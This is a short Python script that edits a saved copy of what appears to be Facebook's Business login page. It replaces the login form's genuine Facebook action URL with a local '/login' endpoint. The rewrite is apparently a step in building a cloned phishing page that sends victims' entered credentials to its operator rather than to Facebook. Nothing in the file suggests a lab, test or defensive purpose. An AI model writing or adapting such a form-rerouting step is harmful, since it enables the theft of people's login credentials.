
import os

filepath = '/Users/p.thuyen/Documents/ProjectFBTUan/login.html'
with open(filepath, 'r') as f:
    content = f.read()

# The unique part identifying the form and its action
search_str = 'id="login_form" action="/login/device-based/regular/login/?login_attempt=1&amp;next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;lwv=100&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"'
replace_str = 'id="login_form" action="/login"'

if search_str in content:
    new_content = content.replace(search_str, replace_str)
    with open(filepath, 'w') as f:
        f.write(new_content)
    print("Successfully replaced form action.")
else:
    print("Could not find the search string.")
